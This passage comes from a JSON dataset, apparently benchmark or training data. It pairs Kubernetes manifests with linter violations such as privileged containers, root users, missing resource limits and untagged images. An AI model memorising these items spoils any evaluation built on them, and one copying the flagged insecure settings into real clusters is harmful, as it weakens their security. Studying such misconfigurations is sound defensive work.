    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.62\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10249\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=default/default-http-backend\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-ingress-lb\" has cpu request 0"
  },
  {
    "id": "03563",
    "manifest_path": "data/manifests/the_stack_sample/sample_1571.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.62\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10249\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=default/default-http-backend\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-ingress-lb\" has memory limit 0"
  },
  {
    "id": "03564",
    "manifest_path": "data/manifests/the_stack_sample/sample_1574.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20201204-d90be1ef6b\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tide\" does not have a read-only root file system"
  },
  {
    "id": "03565",
    "manifest_path": "data/manifests/the_stack_sample/sample_1574.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20201204-d90be1ef6b\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tide\" is not set to runAsNonRoot"
  },
  {
    "id": "03566",
    "manifest_path": "data/manifests/the_stack_sample/sample_1574.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20201204-d90be1ef6b\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tide\" has cpu request 0"
  },
  {
    "id": "03567",
    "manifest_path": "data/manifests/the_stack_sample/sample_1574.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20201204-d90be1ef6b\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tide\" has memory limit 0"
  },
  {
    "id": "03568",
    "manifest_path": "data/manifests/the_stack_sample/sample_1575.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-rdma-cni-ds\n  namespace: kube-system\n  labels:\n    tier: node\n    app: rdma-cni\n    name: rdma-cni\nspec:\n  selector:\n    matchLabels:\n      name: rdma-cni\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: rdma-cni\n        name: rdma-cni\n    spec:\n      containers:\n      - name: rdma-cni\n        image: mellanox/rdma-cni\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 50Mi\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        volumeMounts:\n        - name: cnibin\n          mountPath: /host/opt/cni/bin\n      volumes:\n      - name: cnibin\n        hostPath:\n          path: /opt/cni/bin\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"rdma-cni\" is using an invalid container image, \"mellanox/rdma-cni\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03569",
    "manifest_path": "data/manifests/the_stack_sample/sample_1575.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-rdma-cni-ds\n  namespace: kube-system\n  labels:\n    tier: node\n    app: rdma-cni\n    name: rdma-cni\nspec:\n  selector:\n    matchLabels:\n      name: rdma-cni\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: rdma-cni\n        name: rdma-cni\n    spec:\n      containers:\n      - name: rdma-cni\n        image: mellanox/rdma-cni\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 50Mi\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        volumeMounts:\n        - name: cnibin\n          mountPath: /host/opt/cni/bin\n      volumes:\n      - name: cnibin\n        hostPath:\n          path: /opt/cni/bin\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rdma-cni\" does not have a read-only root file system"
  },
  {
    "id": "03570",
    "manifest_path": "data/manifests/the_stack_sample/sample_1575.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-rdma-cni-ds\n  namespace: kube-system\n  labels:\n    tier: node\n    app: rdma-cni\n    name: rdma-cni\nspec:\n  selector:\n    matchLabels:\n      name: rdma-cni\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: rdma-cni\n        name: rdma-cni\n    spec:\n      containers:\n      - name: rdma-cni\n        image: mellanox/rdma-cni\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 50Mi\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        volumeMounts:\n        - name: cnibin\n          mountPath: /host/opt/cni/bin\n      volumes:\n      - name: cnibin\n        hostPath:\n          path: /opt/cni/bin\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"rdma-cni\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "03571",
    "manifest_path": "data/manifests/the_stack_sample/sample_1575.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-rdma-cni-ds\n  namespace: kube-system\n  labels:\n    tier: node\n    app: rdma-cni\n    name: rdma-cni\nspec:\n  selector:\n    matchLabels:\n      name: rdma-cni\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: rdma-cni\n        name: rdma-cni\n    spec:\n      containers:\n      - name: rdma-cni\n        image: mellanox/rdma-cni\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 50Mi\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        volumeMounts:\n        - name: cnibin\n          mountPath: /host/opt/cni/bin\n      volumes:\n      - name: cnibin\n        hostPath:\n          path: /opt/cni/bin\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"rdma-cni\" is privileged"
  },
  {
    "id": "03572",
    "manifest_path": "data/manifests/the_stack_sample/sample_1575.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-rdma-cni-ds\n  namespace: kube-system\n  labels:\n    tier: node\n    app: rdma-cni\n    name: rdma-cni\nspec:\n  selector:\n    matchLabels:\n      name: rdma-cni\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: rdma-cni\n        name: rdma-cni\n    spec:\n      containers:\n      - name: rdma-cni\n        image: mellanox/rdma-cni\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 50Mi\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        volumeMounts:\n        - name: cnibin\n          mountPath: /host/opt/cni/bin\n      volumes:\n      - name: cnibin\n        hostPath:\n          path: /opt/cni/bin\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rdma-cni\" is not set to runAsNonRoot"
  },
  {
    "id": "03573",
    "manifest_path": "data/manifests/the_stack_sample/sample_1578.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20211020-68b4c3bc47\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cherrypicker\" does not have a read-only root file system"
  },
  {
    "id": "03574",
    "manifest_path": "data/manifests/the_stack_sample/sample_1578.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20211020-68b4c3bc47\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cherrypicker\" is not set to runAsNonRoot"
  },
  {
    "id": "03575",
    "manifest_path": "data/manifests/the_stack_sample/sample_1578.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20211020-68b4c3bc47\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cherrypicker\" has cpu request 0"
  },
  {
    "id": "03576",
    "manifest_path": "data/manifests/the_stack_sample/sample_1578.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20211020-68b4c3bc47\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cherrypicker\" has memory limit 0"
  },
  {
    "id": "03577",
    "manifest_path": "data/manifests/the_stack_sample/sample_1580.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: capabilities_baseline3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        add:\n        - CAP_CHOWN\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities: {}\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03578",
    "manifest_path": "data/manifests/the_stack_sample/sample_1580.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: capabilities_baseline3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        add:\n        - CAP_CHOWN\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities: {}\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03579",
    "manifest_path": "data/manifests/the_stack_sample/sample_1580.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: capabilities_baseline3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        add:\n        - CAP_CHOWN\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities: {}\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "03580",
    "manifest_path": "data/manifests/the_stack_sample/sample_1580.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: capabilities_baseline3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        add:\n        - CAP_CHOWN\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities: {}\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "03581",
    "manifest_path": "data/manifests/the_stack_sample/sample_1580.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: capabilities_baseline3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        add:\n        - CAP_CHOWN\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities: {}\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "03582",
    "manifest_path": "data/manifests/the_stack_sample/sample_1580.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: capabilities_baseline3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        add:\n        - CAP_CHOWN\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities: {}\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "03583",
    "manifest_path": "data/manifests/the_stack_sample/sample_1580.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: capabilities_baseline3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        add:\n        - CAP_CHOWN\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities: {}\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "03584",
    "manifest_path": "data/manifests/the_stack_sample/sample_1580.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: capabilities_baseline3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        add:\n        - CAP_CHOWN\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities: {}\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "03585",
    "manifest_path": "data/manifests/the_stack_sample/sample_1584.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.19.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: config-volume\n      mountPath: /etc/nginx\n    - name: htpasswd-volume\n      mountPath: /etc/nginx/conf\n  volumes:\n  - name: config-volume\n    configMap:\n      name: nginx-config\n  - name: htpasswd-volume\n    secret:\n      secretName: nginx-htpasswd\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03586",
    "manifest_path": "data/manifests/the_stack_sample/sample_1584.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.19.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: config-volume\n      mountPath: /etc/nginx\n    - name: htpasswd-volume\n      mountPath: /etc/nginx/conf\n  volumes:\n  - name: config-volume\n    configMap:\n      name: nginx-config\n  - name: htpasswd-volume\n    secret:\n      secretName: nginx-htpasswd\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03587",
    "manifest_path": "data/manifests/the_stack_sample/sample_1584.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.19.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: config-volume\n      mountPath: /etc/nginx\n    - name: htpasswd-volume\n      mountPath: /etc/nginx/conf\n  volumes:\n  - name: config-volume\n    configMap:\n      name: nginx-config\n  - name: htpasswd-volume\n    secret:\n      secretName: nginx-htpasswd\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03588",
    "manifest_path": "data/manifests/the_stack_sample/sample_1584.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.19.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: config-volume\n      mountPath: /etc/nginx\n    - name: htpasswd-volume\n      mountPath: /etc/nginx/conf\n  volumes:\n  - name: config-volume\n    configMap:\n      name: nginx-config\n  - name: htpasswd-volume\n    secret:\n      secretName: nginx-htpasswd\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03589",
    "manifest_path": "data/manifests/the_stack_sample/sample_1585.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoheaders\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: echoheaders\n  template:\n    metadata:\n      labels:\n        app: echoheaders\n    spec:\n      containers:\n      - name: echoheaders\n        image: registry.k8s.io/e2e-test-images/echoserver:2.3\n        ports:\n        - containerPort: 8443\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"echoheaders\" does not have a read-only root file system"
  },
  {
    "id": "03590",
    "manifest_path": "data/manifests/the_stack_sample/sample_1585.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoheaders\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: echoheaders\n  template:\n    metadata:\n      labels:\n        app: echoheaders\n    spec:\n      containers:\n      - name: echoheaders\n        image: registry.k8s.io/e2e-test-images/echoserver:2.3\n        ports:\n        - containerPort: 8443\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"echoheaders\" is not set to runAsNonRoot"
  },
  {
    "id": "03591",
    "manifest_path": "data/manifests/the_stack_sample/sample_1585.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoheaders\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: echoheaders\n  template:\n    metadata:\n      labels:\n        app: echoheaders\n    spec:\n      containers:\n      - name: echoheaders\n        image: registry.k8s.io/e2e-test-images/echoserver:2.3\n        ports:\n        - containerPort: 8443\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"echoheaders\" has cpu request 0"
  },
  {
    "id": "03592",
    "manifest_path": "data/manifests/the_stack_sample/sample_1585.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoheaders\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: echoheaders\n  template:\n    metadata:\n      labels:\n        app: echoheaders\n    spec:\n      containers:\n      - name: echoheaders\n        image: registry.k8s.io/e2e-test-images/echoserver:2.3\n        ports:\n        - containerPort: 8443\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"echoheaders\" has memory limit 0"
  },
  {
    "id": "03593",
    "manifest_path": "data/manifests/the_stack_sample/sample_1587.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: notion-gtdls\nspec:\n  selector:\n    matchLabels:\n      app: notion-gtdls\n  template:\n    metadata:\n      labels:\n        app: notion-gtdls\n    spec:\n      containers:\n      - name: notion-gtdls\n        image: notion-gtdls\n        envFrom:\n        - secretRef:\n            name: notion-gtdls-env\n        resources:\n          limits:\n            memory: 64Mi\n            cpu: 100m\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"notion-gtdls\" is using an invalid container image, \"notion-gtdls\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03594",
    "manifest_path": "data/manifests/the_stack_sample/sample_1587.yaml",
